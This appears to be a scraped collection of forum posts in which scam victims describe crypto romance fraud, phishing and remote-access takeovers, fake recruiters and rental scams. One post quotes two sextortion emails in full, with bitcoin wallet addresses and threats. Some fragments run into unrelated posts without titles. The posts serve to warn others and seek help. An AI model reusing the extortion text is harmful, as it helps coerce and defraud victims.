Does anyone have experience with this? I have also changed my email address, password, everything on every single app and even made a new insta/fb with completely different login credentials and set up 2FA with the new email address (hacker changed my login info for both apps so I couldn’t log in/get recovery email).

Other questions:
- about how long do these hackers keep this up?
- if they have my social media info and phone number, but nothing else from my phone… they can’t see anything I’m doing on my phone now right? I am just so paranoid they’re able to see my texts or snapchats too or something.

1697514775.0,What kind of scam involves leaving a voicemail with a bank's legitimate phone number?,"Background: My mom received a spoofed call from her bank on her landline. She let it go to voicemail.  The vm sounded like your run of the mill ""we noticed fraudulent activity on your account"" scam.  They did list off the real last four numbers of her card though. 

But the thing is, the callback number they left was the real bank number printed on the back of her debit card, and the scammer even said ""or call the number on the back of your card.""

We know the call is fake because she talked to someone at her branch the next day and there was no ""suspicious activity,"" so what would've happened if she called the real bank number on the card? Wouldn't the associate just tell her that there's no activity? Did the scam just not work cause my mom never answered the call?

1697505144.0,Looking For An Outside Opinion,"Hello there!

Old star wars references aside, I'm in a *very* odd situation, so I'll do my best to summarize:

I was looking to buy a new GPU for my computer, and ended up finding a pretty good deal on FB Marketplace. I did some account snooping to see if the seller seemed legitimate, and once we started talking, things seemed fine. She was quick to respond, and overall just seemed quite nice and straight to the point. I send her the money, and she tells me she'll get back to me later on in the day with a shipping-id. 

More than a day goes by and I hear nothing. I text her, doesn't even read it. Eventually I begin to accept that I've been scammed, and then suddenly she comes back and says she just shipped it, but the shipping-id? No, that would come later in the day. Instead of sending me that, she asks for a screenshot of the transaction (which I had already sent her during the initial payment). 

Since then she hasn't even read my messages where I basically start to politely ask her why she isn't reading or updating me. 

Around two weeks later, so roughly yesterday, I write to her and the phone number I sent the money to, essentially saying that they have 24 hours to pay me back my money or I'll contact the police and bank. The FB sees nothing change (and by now I'm pretty sure the account is hijacked), but through SMS, the story is different.

This part is where things get confusing. First of all, the number I sent the money to was supposedly the number to the daughter, whom was the supposed owner of the card, that her mom was selling for her. So, this daughter's boyfriend contacts me and initially claims that they've also been scammed by the same guy (?), and that they don't know who the seller is (this is confusing, I know). Playing dumb, I write that I understand and that I'll go through with contacting the police and bank on my own. Only then does he call me, and this part is super fucking confusing:

He claims that his friend owed him money, which was sent to the ""daughters"" number, and therefor implies that his friend is the one responsible for the scam. He goes on to say that he'll make sure to give me back my money in around 6 days. He claims that if I lived close to where he is that he could hand me the money in physical cash, but cannot send it because he doesn't have what's required to do so (presumably no bank account). Following this, he sends me a text at 01:00 in the morning, telling me that the person who set up the scam initially will call me tomorrow, which is where I'm at right now. 

I'm sorry if this made no sense, as I can barely understand the situation myself. The way I see it is that the scammer got scared when I threatened them with the police/bank, and now either wants to stop me by sending the money back, or stalling for time to find a way out of this somehow. I just... I sent the money to the daughter, so how the money could end up in the friend's hand is beyond me. Just writing all of this has killed like 99% of my braincells.",Scams,3015,574,88,1
1697505082.0,Worried my church may be giving money to a scam charity organization,"So my church has been giving to this charity presumably located in Uganda for the last several years.  

I’ve read some posts in the past about scams in this area and I guess it gives me a bad feeling.  So the individual claims to be the CEO named Bwire or Emmanuel  something similar started the charity near March 2022 and it’s located in Buwuni Uganda although the Facebook page doesn’t give a specific address beyond Trans-African highway Buwuni Uganda and a PO Box.  Charity name is Impact lives hands of compassion.  The donations are given via western Union money transfer.

Apparently 1 of our church leaders and the charity owner started talking originally through some Christian/religious social media thing before he introduced him to the topic of his charity. The guy seems nice enough, he does calls/video calls, gives receipts of medical supplies etc bought for the children, invites church members to visit (although not really feasible for most of them).  He also posts tons and tons of pictures and I will say the guy (ceo) of the charity is in the majority of them.  

My concerns are from what I’ve read all of this can still be done by scammers. The charity being so new, no physical address seems odd, the Facebook page for the charity has less than 100 followers and no website I can find.  

Am I right to be concerned?  Has anyone else heard of this organization or ones similar?",Scams,1403,244,17,1
1697503508.0,FIL scammed in Phishing attempt - what to do?,"Greetings.

Got a text from my FIL today - “I think my computer was hacked”

Laughed and figured something he couldn’t intuit came up and didn’t think much of it.

Turns out, he was. 4 days ago Hulu was giving him issues and an error code on his fire stick. He googled the error code and he ended up clicking on a non-Hulu affiliated link. It was a phishing site and he was tricked. FIL called the number and ended up being directed on to his computer by the scammers and they had him go to a website and allow them to control his computer.

FIL got wise after 30 minutes into the phone call and realized something wasn’t right. He ended the call and signed out of his computer - put it in sleep mode.

Today, he went out for work and came back and there was a blue screen that said something along the lines of “Do Not Shot Down. Your computer is being fixed” he realized that this was wrong and shut down the computer. The computer turned back on and he had the smarts to put it in airplane mode and remove internet access.

They put two orders in for Netflix gift cards on his Amazon account. The first order - they must have messed up, it was for a physical $100 gift card and it was to be shipped to my FIL’s address. It was canceled by the scammers 5 min later and a digital $50 gift card was purchased. I think that this was canceled by him, but I’m not clear on that.

He’s changed his Amazon, Gmail, and Windows login info, and had his CC the Amazon purchase went through replaced with a new card. And the computer remains in airplane mode. There was likely sensitive personal information on his computer that they may have accessed, but don’t know if that’s the case.


Any suggestions on how to move forward? How much damage control do we need to do here? Also, need to figure out if there was malicious software installed or not or if they just gave themselves remote access permissions.

1697499457.0,Victim of a Pig Butchering Scam Big Time,"I am going to share a personal experience with online crypto currency scamming that just happened to me in hopes I can help even one person have to go through what I just did. I have known about scams as Nigerian scammers got me back in 2018 and I thought I was able to spot a scammer a mile away, but how wrong I was. On May 8 I was browsing Facebook and checking my accounts for messages from friends when a pretty Asian woman named Kai Lin reached out and said hi to me. I was about to delete her and move on (boy, how I wished that I did) but I said hi in return. I then asked where she was and she mentioned South Los Angeles by way of Singapore which was her home country. I asked her what could I do with her so far away as I am near Washington D.C. and she replied: "" I don't think distance is a problem. If you have a heart, it doesn't matter how far you are. If you don't have a heart, you will feel far apart if you re 1 mile away."" I felt bad at my response, so I continued to engage her and she was very enthralling, and we had about a week of wonderful conversations, talking about family, future goals and many other things like being filial to our parents and then the topic of money came up, very suttle at first but I was told that I am well off but not boasting and I thought ok, now what? I listened more and told her I was trying to set up my parents to retire and provide support them and that is when I was introduced to investing. I did not know what investing at first and another week or so passed until cryptocurrency was brought up. I did not know anything about it and I told her I needed to do some research and she offered to reach me. I said OK and we went on a tour of her ""visuals"" (which turned out to be complete fakes) and she said we should start with a small amount like $1000 to see if it was something I wanted to do further. She also said I will do it with you and show you how I make money.  Still nervous but she had doe her homework to find out thongs about me to know what buttons to push so I wired $1000 from my band to [Crypto.com](https://Crypto.com) after creating an account there and then we also created an account at [crypto-dex.org](https://crypto-dex.org) (it used to be [crypto-dex.com](https://crypto-dex.com) but had changed on July 1, more on that later) and then Kai Lin took me on a tour of the website and showed me how to invest in BTH, turning my dollars into USDT and also how to watch the market. I made $171 on the first trade of $10 but then my money sat for over a month and when I asked why Kai Lin told me I needed to advance to the upper levels where she traded and to do that I needed to come up with $20K more. When I said now, I wanted out, she again shamed me and told me I had no ""vision"" and would never amount to anything. I started checking out some inconsistencies in her story and then found out her Facebook page under the nae Kai Lin was created by someone named Greg Williams. I asked her about this and was told not to worry about it. Red Flag there so I took note and then tried to search further. I image searched her photos and could not find her face using the normal Google or Yandex so I was introduced to AI (Artificial Intelligence) and got hold of a powerful tool and searched again and my jaw hit the floor when I got back the results. This person was NOT who she claimed to be. Every week I would get some pretty photos of a beautiful Asian women and I though they were her. But AI proved different s it found her photos quickly. They turned out to be a set of photos of a woman called Thet Htar who is from Myanmar and is Burmese. She is stunningly beautiful, and I also found out this scammer was using her pictures in 12 (twelve!!) different accounts. So, I confronted her and told her I was done and wanted my money immediately and called the customer service help center of [crypto-dex.org](https://crypto-dex.org) and asked for a withdrawal. Kai found out about this and immediately got online and tried to persuade me to stay after she said, if you believe I am a scammer, go withdraw all of your money. When I tried to do so, she came back and talked nicely and said before I got my money, I had to complete an ETH challenge. I did not know what that was but if it was going to get me back my money, I agreed. I wanted out and I wanted to go back to a normal life. But lo and behold, the ETH challenge was I had to purchase 20 units of ETH at $1668 apiece and then one done, I would have passive income of about $12,000 to supplement my earnings. But ETH meant I now had to spend over $112,000 to buy the ETH and then get back my 60K in the account. Of course, I could not do that so I tried to see what was possible. I called customer service once again and they said if you did not finish the ETH challenge you would be ""punished"" and ironically or not ironically Kai came back online and said the exact same phrase to me, I would be ""punished"" by losing 5% each week until my funds were exhausted. I asked Kai for help, and she told me there was no other way and now getting frantic I asked what could be done. She offered to help but only after I put up my part of the money first. It was then I realized that I was being scammed and I had lost my money. I called the FBI and Secret Service and filed reports but to no avail. I yelled and screamed at her and cussed her out good and she returned the favor and still said only after putting in 20K could I get my money back. There is more to the story as she told me to fly to Los Angeles and meet her, but I found out she is in Asia beholden to the Chinese triads working in some call center and having to scam 5 new people every day or risk being punished, beaten or worse. In short, my money is gone all 60,000 of it and I feel shamed but if this can help anyone, it was worth it. The nae Kai Lin should be looked out for and if you see a face you do not recognize, use [facecheck.id](https://facecheck.id) to search it, it works really well. She was a liar, a thief and seems to have zero shame stealing money from people and leaving them broke. I saw some red flags but at first she was so nice I thought that they were not as bad as it turned out and they were worse. Please avoid any new people popping up in your feed, ANY online crypto currency investing (it is a 100 percent scam ALWAYS) and I have lost 60K but have turned ot over to the FBI and Secret Service. I don't expect much but is worth the try. Kai Lin is a scammer and she has 12 accounts that she is using to scam people.

1697491139.0,New & Improved Media Scam,"I am writing this so that it’s a help and guide for others who may be getting scammed through this new company they found. 

It buffles me to see legitimate businesses go under only for someone to come and claim it, create profiles impersonating the people who actually worked on it.

I’ve been very vulnerable with trying to find employment. The hiring process is truly exhausting, sometimes I want to throw my phone away because I’m sick of literally receiving the same robotic messages, endless one-way interview and just rejections after rejections. I’m literally someone who puts her full heart in what she does, I have 6 years experience with the same company — leaving only because of time difference. I’m resourceful, loyal, compassionate and enthusiastic. Within those 6 years I’ve been promoted every year! How do I prove that to a bot? I’m literally so demotivated of having million follow up 6,7 interviews and assessments only for it to end at radio silence. My time is literally wasted on these endless steps. 

Now that you know my frustration with the hiring process loop, I became detached to anything that comes my way and just apply and answer without thinking where it’s headed. With this particular scam, I applied to several job openings on LinkedIn. The job posting had 350+ applications when I had applied and they closed it and were no longer accepting applications. 


I never thought about scammers or anything on LinkedIn. I checked the profile of the poster — had pretty good 600 connections, some endorsement from previous colleagues, connected to the company profile, a nice photo, location checked. I was like okay everything checks out. I applied and 30mins later the person reached out to me.

Asks me to continue an interview via teams and to follow a link. Again, I didn’t think much of it, I did. It was at 8/9pm, at first I found it strange that it was a chat interview with the “President” of the company. But then I thought maybe it’s a small company. I moved on and did it. Then after 15 questions or so, again nothing suspicious was asked he said I’ll get back to you next week. No urgency, no nothing. Scammers are known for pressuring individuals and moving fast. But not with this so I didn’t catch on it.

A week or so pass, and I forgot about it. No one texted me so I didn’t think about it. Then one day he messages me and says he will get back to me in a week. Mind you the one thing that made me suspicious is the rate they were paying for an operations manager, it was $45/hr. 

After that message I started looking them up, checked his connections, employees of the company on LinkedIn, I went too deep with my search until I ended on their Facebook. Looked like a very diverse company with a lot of fun team bonding activities, photos, comments from real people etc. But here is the catch, their last post was in 2016. So that made me alittle more suspicious. And I left it at that.

Two weeks since having this “chat” interview by the actual president for this too good to be true $45/hr operations manager remote position, I miraculously received an email with the subject “Offer Letter”. Lo & behold it’s them with an attachment of the offer details. Then I check the sender it’s a yahoo email with no domain. My suspicion grew even more, so I checked his IP address and compared it to Linkedln location, company address. Something didn’t add up. 

So I went on digging, nothing about New & Improved Media came up with scam likely. Other scam likely with similar pattern came up from redditors. That reaffirmed my suspicion and the tactic used was more or less the same just a different company name used this time is linkedln instead.

So I wanted to confirm this is actually accurate and this company is no longer functioning. I went on Facebook and messaged every employee who commented on any of their post in 2016 and before. I messaged at least 15 different people on Facebook. The first response I got was “they’re no longer in business” and the two more said the same thing. One going out of his way to confirm with his previous boss who confirms the same and says the said President is actually retired. The same “President” who has been messaging me and offered me the position. The poor guy is being impersonated by some scammer.

And what do I do next after the good Samaritans confirm? The guy messages me and pushes me to send over the signed Form I-9, this makes the scam more official? Idk but it’s daunting to know this form literally provides all your personal information to the scammers including SSN. I said to him no thank you, and I curse him in Hindi just to see how he responds. Thanks to my friends for teaching me the bad words. Guess what he asks, “Where are you originally from actually?” No we know it’s some dude in Mumbai using VPN. 

I’ve gone through the trouble so you don’t have to. Please do proper research and for the 100th time if something is too good to be true, it probably is.

1697489442.0,Fullstaq affiliate course (Business Launch Challenge),"I have to post this because it took me some googling to connect the dots. 

The Fullstaq course will walk you how to set up a funnel. They won’t actually explain what they’re doing, it’s more of a “just click here, open that, log in here, paste your info there and save” type of class rather than an explanation of what is actually happening. 
However. The funnel they’re walking you through the setup for is a funnel for their class. So the whole time unbeknownst to you, you’re basically signing up to resell their class. 

The modules are maybe 1-2 hrs a day and the remaining 6 hours are just toxic positivity-prinkled pseudo-hypeman rhetoric (“no complaining, no whining, no negativity”, so you are shamed for telling them the class sucks or it’s useless)

The class is “only” 39.99 but you know what else you will have to pay for? A domain. Hosting. That’s like $45. And once you’ve spent 2 days setting up your funnel, the moment it is complete with your auto responders for your product guess what! there are no more modules or explanations, just a link to where you can buy traffic and some more programs valued at $60K that you can buy for the low low price of only an additional $5K. Oh and you know what else! The traffic source they recommend for you, you know, the thing you get people to buy their course from? It’s another $80-$700 MONTHLY. Because no one is organically visit Imbrokeanddesperate.com. And of course, they claim the more you spend the more leads you’ll get. 

Here’s the kicker. 

I looked up the traffic company they recommend, Zero Chase Media at 3651 Lindell Rd, ste d513, Las Vegas NV

You know who else uses that address? Fullstaq. But did they tell you that? No lol

 So they will make money off of you setting the funnel and from traffic YOU FUND to their ad to sell more courses where more people will pay THEM to set up more ads for more courses where more people will pay THEM to set up more ads for more courses… etc.

They also encourage you to ask other people on the class to test your website by putting in their email address, and then that in turn becomes a lead in your funnel so everyone started thinking they immediately had leads (again, the elderly and the technologically ignorant) but really it’s just your other classmates helping you test your site.

The only reason I’m sharing this is because I paid a minimal amount for this course and am not spending another dime, I am in a position where $40 is nothing, but there are broke, desperate and elderly people (my class had hundreds) who are going to sign up for the $5K course and maybe more, unaware of what’s happening because during the course they didn’t even know how to open up a chrome tab or exit full screen mode or resize their screen windows.

Next month comes and I see a transaction from the account that was linked to that same card. Attempted Netflix purchase. Confirmation. Instantly reordered new card. 

I just got a call from ""my bank"" saying it was fraud prevention. *Sigh* they said the card ending in 1234 (not the real #) was just attempted to be used out of state and they were calling to confirm it wasn't me.

Here are the red flags:

1. Offering more than I asked for - They offered more than I asked for citing minimum requirements for investment and their assessment of how much I will *actually* need.
2. Offering to take less equity than i offered, again citing that it would be better for my company to grow if they take less equity.
3. New website - their website is 3 months old despite being founded in 2005.
4. No social media or online presence other than their website
5. Off shore accounts - they said documentation from their bank proving their ability to provide this capital will come from an off shore bank in China due to the ongoing crisis in Israel.
6. On a zoom call the representative barely asked any questions about my company stating that my pitch deck gave him enough Information.
7. On the call the representative only had his camera on for a short period of time because of poor connection
8. The representative claiming to be from Switzerland did not seem to have a Swiss accent, although he did look European (perhaps a deepfake?)
9. Refusal to disclose other investments citing NDAs
10. Website comes up as likely to be a scam

I did not provide any sensitive company information and I can't think of what the scam can be if they are proposing to give me money and they have not asked for any banking information from me (yet). I checked Israeli public records and the company **DOES** indeed exist and was founded in 2005 as stated on the website and the address in the website matches the record as well.",Scams,1785,328,24,1

1697477991.0,Trying to fire real estate agent seems scammy,"I need to break up with my realtor and hire a new one to sell my home in VT. He’s been too busy to sell the house this month. I paid $90,000 for the down payment and need my money back! We need to sell this house fast. My ex co-worker is also on the title (long story but yes, I’m a fool) because he agreed to help pay for the house but then never followed through. He said I’m an angel for helping him and I’ll get my money back when the house sells.

Our current realtor drafted up this contract to terminate the real estate contract so we can fire this guy and hire a more committed real estate agent to sell the house. The realtor said we won’t owe him or his real estate agent any money if we break the contract early. 

I cannot get in touch with VT Legal Aid for 5-7 business days so in the meantime does this contract look legit? The more eyes that look at it the better. Maybe someone will find a mistake I missed when reading it. All I am asking to do is fire my real estate agent and find another who has the time to show the house and host open houses. I see a few red flags but my parents said I’m just crazy and paranoid.

1697477193.0,Booking.com Scam,"Recently got a notification that someone had used my booking.com account to order 10 hotel rooms in another country. I checked with both booking.com and the hotel that apparently gave out the rooms.  Both confirmed that someone had ordered rooms under my name at that location. I didn't have a payment method attached to my account so nothing was charged to me or family members. Is wondering what the scam even was. They put in a fake declined card to hold the rooms. Did some digging and no cards have been opened in my name recently. And yes, I did go through all my accounts and changed passwords just to be safe. Even double checked i've never had a card with that number before. 

So any idea what the scam was and what they were trying to do or what's going on?

Update: Ended up canceling the reservation from my end instead of waiting for booking or the hotel to do it. It says there was a cancellation fee but since there wasn't a valid card on the order to charge and mine wasn't on there either it didn't really matter. Ended up closing the account soon after.",Scams,1072,198,23,1
1697476816.0,Extremely responsive and realistic bot or just a determined live scammer?,"I recently received a phone call from someone claiming to work for a US government agency that does not exist. The name of the imaginary agency includes my states name so I will leave it out. The scammer did not have a robotic voice but the intonation was very distinct and slightly “off”. They had an American accent.
 
 They started by “identifying” themselves, claiming to be doing a government survey, reading my number back to me, and asking if they had the correct number. I said “no” and the person on the other end said “I’m sorry, I’ll hang up and try the correct number”.
 
They immediately called back, said the exact same script with the exact same intonation. I again said “no”, they again apologized in the same way and said they would try the correct number. 
 
This happened exactly the same way 3 more times. On the final one I accused them of being a bot, they gave a response along the lines of “ohh no I’m not a robot I am a human being”, I attempted to interrupt them several times through this response with no reaction. I then asked them their current stance on the political climate of the US. They said “my boss can hear this call and I would rather not discuss politics”. I again attempted to interrupt them to no avail or even slight response. I then said “take me off of your call list” and they tried once more to get me to take the survey, I repeated the request to remove me from the call list, they said okay and I haven’t heard from them since. 
 
I was almost certain it was a bot. The vocal patterns, repetition, and inability to interrupt them made me believe they were a scripted bot. However I’ve never seen or heard of a scam bot that sounds quite that realistic and has responses for random things like politics.
 
I know with certainty that it was a scam of some kind as the number leads no where and the agency they claimed to be from does not exist, period.

I rarely post on reddit but I do believe this is an important PSA.  
My fiancee and myself are getting married next year in  NSW-Australia  We consulted Christopher(from Orchard Catering) in June to do the catering for our wedding. He asked for a first deposit which we did and then another deposit 2 months later which we did again as he said he would give us a 10 % off the final quote as he was running a special offer. We took on the offer.

After he cancelled 3 appointment with us within 24 hours where we were supposed to meet, we decided to terminate our contract with him. due to his poor professional behaviour. As per contract, we were entitled for a refund.  
He then revealed that he had filed bankruptcy in July after he received the first deposit.(official document states that bankruptcy was filed 2 weeks after our first deposit) and that he owns money to multiple other people). He admitted without remorse of asking for a second deposit even though he knew he was bankrupt.

The Australian financial Security Authority is aware but can only help us partially. We won't be able to get our big deposit back.

The most appalling part is that he has admitted to have taken money from multiple couples for their wedding and none of them knows anything about this situation.  
He has removed reviews from google .

What was meant to be the best day of our lives has taken a sour turn.  
Are there any ways we can warn couples and businesses that they are likely not to receive any services from Christopher(orchard catering) for their big day? We don't want other people to be scammed as we did

Let me explain to you what that entails. Thanks to Trojan viruses, I can gain complete access to your computer or any other device that you own.

It means that I can see absolutely everything in your screen and switch on the camera as well as microphone at any point of time without your permission.

In addition, I can also access and see your confidential information as well as your emails and chat messages.

&#x200B;

You may be wondering why your antivirus cannot detect my malicious software.

Let me break it down for you: I am using harmful software that is driver-based,

which refreshes its signatures on 4-hourly basis, hence your antivirus is unable to detect it presence.

&#x200B;

I have made a video compilation, which shows on the left side the scenes of you happily masturbating,

while on the right side it demonstrates the video you were watching at that moment..ᵔ.ᵔ

&#x200B;

All I need is just to share this video to all email addresses and messenger contacts of people you are in communication with on your device or PC. 

Furthermore, I can also make public all your emails and chat history.

&#x200B;

I believe you would definitely want to avoid this from happening.

Here is what you need to do - transfer the Bitcoin equivalent of $650 to my Bitcoin account

(that is rather a simple process, which you can check out online in case if you don't know how to do that).

&#x200B;

Below is my bitcoin account information (Bitcoin wallet):

bc1qnpmkx704fcugzuc727axz9dqqnjf904fz2qq8n

&#x200B;

Once the required amount is transferred to my account, I will proceed with deleting all those videos and disappear from your life once and for all.

Kindly ensure you complete the abovementioned transfer within 50 hours (2 days +).

I will receive a notification right after you open this email, hence the countdown will start.

&#x200B;

Trust me, I am very careful, calculative and never make mistakes.

If I discover that you shared this message with others, I will straight away proceed with making your private videos public.

&#x200B;

Take care and have a good day.

&#x200B;

BUT now I received a second email which is below… I understand it’s probably a scam but the follow up is freaking me out. What should I do? I ran a deep scan on my computer and it came up with PDF:PhishingX-gen\[Phish\] in my mailbox folder. what does this mean?

&#x200B;

**Hi, my prey.**  
This is my last warning.

I write you since I attached a tr ojan on the web site with porno which you have viewed. My trojan captured all your private data and switched on your camera which recorded the act of your solitary se x. Just after that the tr ojan saved your contact list. I will erase the compromising video records and info if you transfer 710 United States Dollars in bi tcoi n.

This is address for payment: 1DvEgCFc6MHsbajRvkctjUPAPtn51b6DcN

I give you 24 hours after you open my message for making the payment. As soon as you read the message I'll see it right away. It is not necessary to tell me that you have sent money to me. This address is connected to you, my system will erased automatically after transfer confirmation.

If you need 40h just Open the calculator and type +,+

If you don't pay, I'll send dirt to all your contacts. Let me remind you - I see what you're doing. If you try to decieve me, I'll know it immediately. I don't live in your country. Bye. Don't forget about the shame and to ignore, your life can be ruined.",Scams,4039,702,92,1

I received an email from this Agoda recruiter with the domain [tyffany.wilson@agoda.global](mailto:tyffany.wilson@agoda.global). she sent a link asking me to book a time slot and then.

At first I clicked into the link and booked a time slot, and then after I got sent a microsoft teams video invite. When I clicked into it on the agreed date and time, she did not show up. After couple hours she said she had some issues with her Microsoft Teams and offered to reschedule the interview. with link to book time slot again.

The thing is I actually applied to this job position on the actual agoda website, but I am not sure if this recruiter is the real deal or not. Her email does not have any Agoda logo previously, now it does. Her Linkedin doesnt seem like she updated OR it is blatantly a scam profile(created in 2022). Also, I applied to a job in Bangkok, but she is based in the UK. using the email agoda.global.

I fell for a scam today on a bitcoin selling website known as fowbit.com. I’ve never fallen for a scam before, and I’m certainly hitting myself over the head. I was on my go-to legit bitcoin site where I buy/sell, and I saw a pop-up that said that the site I was on had a new side-project called fowbit.com. All of my bitcoin information, wallet and how much I had and all, was already on there after I made an account. It’s a very legit looking site (until you start reading the terms of service). I went to withdraw some of my bitcoin to transfer it into another crypto, but the site said that I needed to verify my account by purchasing 0.01 bitcoin (a $300 purchase). After purchasing the 0.01 bitcoin, my account only had 0.0099 bitcoin on it, so my account still wasn’t verified. Embarrassingly enough, that’s when I got the first red flag. The domain was only registered four days ago and all contact emails are Russian. When making my account I provided my email, SSN, and drivers license, which didn’t raise any red flags with me because that’s normal with crypto trading sites. They also have my card info, but I cancelled it and have a new card coming. 

I’m sorry for the block of text, but I have reported the site, started a claim with my bank to get the $300 back, and changed my card number.

1697422923.0,I got scammed as a broke 20yr old and need help,"3 months ago I had to move out of my apartment at a one months notice so I was desperately looking around for apartments. Everywhere in my city is really expensive and I couldn't find a place to stay until I found a house for rent listed on Craigslist (first mistake I know.) I emailed the owner asking for a viewing, they told me I could go look at the house. When I did it was exactly like the photos and everything seemed to be legit. The man in the emails said he was currently in chemo therapy and couldn't meet up with me in person to do the viewing. I asked around and everyone in my life told me it seemed legit. I filled out an application and within a day or two they said I had been approved and told me to send the first months rent and deposit and then they would leave the keys at the house so I could move in. He asked me to use zelle to send the payment (my next big mistake.) I sent the $1560 so I could move in. Once I sent them the money they immediately told me to send them more because they changed their mind on the deposit amount. When I told them I couldn't afford to send them any more money, because that was literally all I had left, they went completely silent. After a few days of not hearing anything I contacted my bank to try to label it as fraud. The bank told me since it was a zelle transaction there was nothing they could do. I called zelle and they told me to talk to my bank. I talked to probably 10 different people my bank over phone and in person and they all told me the exact same thing. At that point I got my local police involved. The police took over 2 weeks to even look at my case. I had to call them over and over again before they even assigned a detective. They told me it took so long because the email I sent them with my evidence, which they told me to send, got put in their spam folder. Within a day of being assigned a detective they told me they weren't going to investigate it and to contact ic3 instead. I sent in a report and after not hearing back for over a month I sent in a second one and still haven't heard anything. I tried to find the person on my own and have yet to be able to because I believe they used a VPN and a fake name. I have their email addresses and zelle account. I don't know what to do. I was able to finally find a place to live but I'm beyond broke and struggling to stay afloat. I don't have family to fall back onto/get help from. Just getting the money back would significantly help me. I really just want to know if I have any options or if I'm just screwed. Any and all help is appreciated.

How do I know this website is a scam? Well here's my story. 

I was looking for a puppy, I stumbled upon this website for teacup maltese puppies! They showed that they had some available for sale.

On this website it claims you can have the puppy shipped to you! For extra fees and such well I contacted the phone number messaged them back n forth for a week! Then asked if I could just pick up the pup at the location posted on the website. 

They said sure but they couldn't hold any puppy without a deposit! Well I didn't put a deposit down, luckily! I said I was willing to take the risk! Of which ever puppy was left available.

Well I drove about 6 hours, yesterday I got to there house! I called them 3 times they never answered I text message them allot keeping them updated on my travel time. Also text them when I arrived, well they didn't respond.

So I drove to a near by school! And sat in the parking lot for an hour just to find out they emailed me saying they don't have the pups available anymore,  eventhough there website still shows available pups.

So I made another email! Messages them they respond to that email saying all the pups were available for sale.

So end of the story is dont trust that website.
& do not put any deposit down for any pups that u can't see in person. 

I hope no one else gets there money robbed.

1697410766.0,Events & Adventures is expensive garbage,"So this post is partially for me to vent, partially for me to ask for advice, and partially for me to publicly document my experience with them as a warning to anyone else considering paying for a membership with Events & Adventures ([https://eventsandadventures.com/](https://eventsandadventures.com/)). Enjoy.   


TLDR: I'm an idiot and fell for E&A's marketing only to find their ""service"" is high-priced garbage. Please don't be like me.   


I signed up with Events & Adventures while living in Seattle, Washington. I had moved there for a new job; I was unfamiliar with the city and knew basically no one there. I also was desperately single. After spending several months trying and failing to meet, frankly *anyone*, I heard about this company and contacted them. They present themselves as professional organizers for local events for singles to meet each other, which seemed like a great idea for someone in my situation. They charge a premium price for this service, but claim that is because roughly half of the monthly events are provided free, and the rest of the events are at discounted prices. By premium price, I mean literally thousands of dollars for a 1-year membership (the minimum time they let you join for). They also claim they do a thorough screening/background check on all applicants for the safety of their members. The interview process they make you go through was a little weird, but I was so lonely and desperate at this point I looked past that. I unfortunately also looked past all the fine details in the membership agreement, which continues to hound me to this day. I stupidly signed up, agreeing to pay an initial $500 initiation fee and then $130/month for the next 18 months.   


First off, while they heavily imply that they perform background checks on applicants, there is no way they could have performed one on me prior to letting me join. I didn't give them enough identifiable info prior to my ""interview"". As soon as my check cleared at the end of the 1 hour interview and I had signed the membership contract I was allowed to start attending events. As far as I could tell, their screening process begins and ends with ""did their check clear?"" 

&#x200B;

Now, on the the actual events they ""organize"". Calling them amateurish would be generous. The new members ""ice breaker"" was advertised as a wine-tasting and boardgames night. I signed up and was told to bring ""Your favorite board game (optional) and a quick snack for yourself or to share !"" and that it was occurring at a member's house. Seriously. I paid a $500 initiation fee and $130 that month so I could go to some random dude's house and *provide my own boardgames and wine*. E&A literally provided nothing for this event, not the venue, not the drinks, not the entertainment; everything was provided by the paying members. This turned out to be a recurring theme, at least with all of the free events. I did not see a single free event where E&A incurred any costs whatsoever. Quite of few of the events they listed on their calendar were either things that are normally free (like hiking) or community events that they had absolutely no involvement in. As an example, they listed an event called the ""Tacoma Brunch Market Event"" on their calendar. I signed up and drove over to it, only to find out this is a monthly event put on by the Tacoma community; E&A had just slapped in on their calendar to make it look more busy. On top of that,  I didn't find the actual E&A group I was trying to meet up with. I tried calling/texting the host after getting there, but got no response. It was only many hours later, after the event was well over, that I received an apology text from the host claiming they had forgotten their phone with a friend. I would have told the host off, except it turned out they weren't actually an employee of E&A, they were a *volunteer member*. In fact, of all the events I attended, only the very first ""ice breaker"" event actually had a single E&A staff at it, all of the other hosts were just paying members. I suppose the paid events might have been better organized, but the prices they were asking seemed pretty outrageous, even before considering the monthly fee I was already paying to the company. I never went to a paid event. 

&#x200B;

As I'm sure many of you have already surmised, it's next to impossible to cancel the membership agreement. The fine print on their membership contract states ""All membership agreements signed outside of an Events and Adventures office can be cancelled within 3 business days with no cancellation penalty, if you have not yet attended an event."" So basically, by the time you understand what the service is actually like, you're trapped in the contract. In my case, I ended up moving back to my old company in San Diego. Even though E&A does not provide their ""service"" in San Diego, they will not let me cancel the agreement. They've explicitly acknowledged to me that they realize I cannot attend any of their events, but they are still charging me anyways (\~$1600 for the rest of my membership). 

&#x200B;

Right now, I'm refusing to pay and they are threatening to send me to collections. The state of California has consumer protection laws that specifically forbid this type of behavior. Unfortunately I signed the contract in Seattle, and as far as I can tell Washington doesn't explicitly forbid it. Now, I would argue that a contract that requires someone to pay thousands of dollars while receiving *absolutely nothing* would fit the definition of ""unconscionable"" in the legal sense. But, I'd have to file a lawsuit in Seattle's small claims court to find out. I'm honestly not sure how to proceed, so any suggestions are appreciated.",Scams,5738,992,146,1

I can recall a few of them … there were the “envelope stuffing” scams, the “art school” scams (“DRAW THE PIRATE!! YOU MAY WIN A SCHOLARSHIP!!!”), and many others I only vaguely recall.

I actually fell into a “solve the puzzle!!” scam when I was about 9 years old. I was (and still am) an avid crossword fan, and this puzzle scam began with a simple mathematical logic problem. The details escape me, but I solved the puzzle and eagerly mailed (by U.S.P.S) my entry and dreamed of the big prize that would follow.

What followed was not a prize, but another puzzle to solve … apparently so many people had qualified for the BIG PRIZE that I would have to compete in the tiebreaker round…the first of many. So I again solved and eagerly mailed the second round answer for my prize.

No luck; just another tiebreaker puzzle followed. At this point, I approached my Dad, who taught me the ways of the scammer. As best I recall, this “contest” was nothing more than a “bait-and-switch” which over time would morph into a “to claim your prize, send X amount of dollars to Charlie Moneybags”.  But alas: I had been hooked.

By entering this “contest” my name / address etc. would be forever enshrined in the “Suckers List” and BOY did I get mail by the boatloads!! The postman hated me.

The order went through fine and I would frequently check my Amazon to see where it was. Then a few days ago, I got an update on the Amazon page saying there was going to be a delay on my friend's gift. Alright, that's fine. Delays happen.

But then yesterday, I got a text saying a delivery was put on hold due to an incorrect zip code. There was no specifics to what was put on hold or where it was bring shipped from.

